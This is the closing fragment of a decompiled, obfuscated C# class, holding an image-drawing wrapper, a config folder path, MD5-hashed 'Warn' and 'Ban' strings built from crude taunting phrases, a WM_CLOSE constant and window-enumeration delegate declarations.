		// Token: 0x0600093D RID: 2365 RVA: 0x01055C2C File Offset: 0x01053E2C
		static void smethod_0(Graphics graphics_0, Image image_0, Rectangle rectangle_0, int int_0, int int_1, int int_2, int int_3, GraphicsUnit graphicsUnit_0, ImageAttributes imageAttributes_0)
		{
			graphics_0.DrawImage(image_0, rectangle_0, int_0, int_1, int_2, int_3, graphicsUnit_0, imageAttributes_0);
		}

		// Token: 0x04000430 RID: 1072
		private static string folder = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.PerUserRoamingAndLocal).FilePath.Substring(0, ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.PerUserRoamingAndLocal).FilePath.Length - 11);

		// Token: 0x04000431 RID: 1073
		private static Random random = new Random();

		// Token: 0x04000432 RID: 1074
		public static string Warn = Local.CreateMD5("WARNHISM@THERFUCKER_AHAHHAHAHAHHAHAHHA");

		// Token: 0x04000433 RID: 1075
		public static string Ban = Local.CreateMD5("B@NTHISM@THERFUCKER_AHAHHAHAHAHHAHAHHA");

		// Token: 0x04000435 RID: 1077
		private static uint WM_CLOSE = 16u;

		// Token: 0x02000074 RID: 116
		// (Invoke) Token: 0x06000967 RID: 2407
		private delegate void ProgressDelegate(string sMessage);

		// Token: 0x02000075 RID: 117
		// (Invoke) Token: 0x0600096B RID: 2411
		private delegate bool EnumWindowsDelegate(IntPtr hwnd, IntPtr lParam);
	}
}
